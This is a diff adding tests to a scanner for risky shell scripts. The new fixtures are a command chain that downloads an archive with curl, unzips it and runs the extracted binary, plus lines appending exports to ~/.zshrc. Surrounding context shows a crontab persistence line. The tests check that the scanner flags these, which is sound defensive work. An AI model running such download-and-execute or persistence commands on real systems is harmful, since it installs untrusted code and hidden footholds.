@@ -39,6 +39,54 @@ describe("scan", () => {
     expect(result.findings.some((f) => f.category === "second_stage_payload")).toBe(true);
   });
 
+  it("tracks a variable-derived archive through extraction and execution", () => {
+    const result = scan(`
+      archive_uri=https://example.test/tool.zip
+      exe=$HOME/.local/bin/tool
+      curl --fail --output "$exe.zip" "$archive_uri"
+      unzip -oqd "$HOME/.local/bin" "$exe.zip"
+      mv "$HOME/.local/bin/tool-release/tool" "$exe"
+      chmod +x "$exe"
+      TOOL_UPDATE=true $exe completions
+    `);
+    expect(result.findings).toEqual(expect.arrayContaining([
+      expect.objectContaining({
+        ruleId: "chain.archive-output-execute",
+        category: "download_execution",
+      }),
+      expect.objectContaining({
+        ruleId: "chain.second-stage-variable-archive",
+        category: "second_stage_payload",
+      }),
+    ]));
+
+    const storedOnly = scan(`
+      curl --output "$artifact.zip" "$url"
+      unzip "$artifact.zip" -d "$cache"
+      chmod +x "$other_file"
+    `);
+    expect(storedOnly.findings.some((finding) =>
+      finding.ruleId === "chain.archive-output-execute"
+      || finding.ruleId === "chain.second-stage-variable-archive"
+    )).toBe(false);
+  });
+
+  it("tracks startup-file variables used by compound redirects", () => {
+    const result = scan(`
+      zsh_config=$HOME/.zshrc
+      commands=("export TOOL_HOME=$HOME/.tool" "export PATH=$TOOL_HOME/bin:$PATH")
+      {
+        for command in "\${commands[@]}"; do echo "$command"; done
+      } >>"$zsh_config"
+
+      logs=(/tmp/worker.log /tmp/audit-copy.log)
+      for log in "\${logs[@]}"; do echo ok >>"$log"; done
+    `);
+    expect(result.findings.filter((finding) =>
+      finding.ruleId === "persistence.shell-rc-variable"
+    )).toHaveLength(1);
+  });
+
   it("detects persistence and credential access", () => {
     const result = scan(`
       echo '* * * * * /tmp/a' | crontab -
